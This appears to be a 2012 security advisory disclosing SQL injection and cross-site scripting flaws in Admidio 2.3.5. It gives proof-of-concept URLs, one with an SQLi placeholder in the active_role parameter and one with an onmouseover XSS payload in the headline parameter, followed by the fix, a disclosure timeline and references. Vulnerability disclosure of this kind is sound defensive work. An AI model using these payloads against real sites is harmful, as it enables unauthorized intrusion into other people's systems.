@@ -1,0 +1,51 @@
+Advisory:		Admidio 2.3.5 Multiple security vulnerabilities
+Advisory ID:		SSCHADV2012-019
+Author:			Stefan Schurtz
+Affected Software:	Successfully tested on Admidio 2.3.5
+Vendor URL:		http://www.admidio.org/
+Vendor Status:		fixed
+
+==========================
+Vulnerability Description
+==========================
+
+Admidio 2.3.5 is prone to XSS and SQLi vulnerabilities
+
+==================
+PoC-Exploit
+==================
+
+//SQLi
+
+http://[target]/admidio-2.3.5/adm_program/modules/lists/lists.php?active_role=[sql-injection]
+
+//XSS
+
+http://[target]/admidio-2.3.5/adm_program/modules/guestbook/guestbook_new.php?headline=" onmouseover=alert(/xss/) "
+
+=========
+Solution
+=========
+
+Upgrade to the latest version 2.3.6
+
+====================
+Disclosure Timeline
+====================
+
+21-Aug-2012 - developer informed
+21-Aug-2012 - feedback from developer
+28-Aug-2012 - fixed in version 2.3.6
+
+========
+Credits
+========
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+===========
+References
+===========
+
+http://www.admidio.org/forum/viewtopic.php?t=5108
+http://www.darksecurity.de/advisories/2012/SSCHADV2012-019.txt
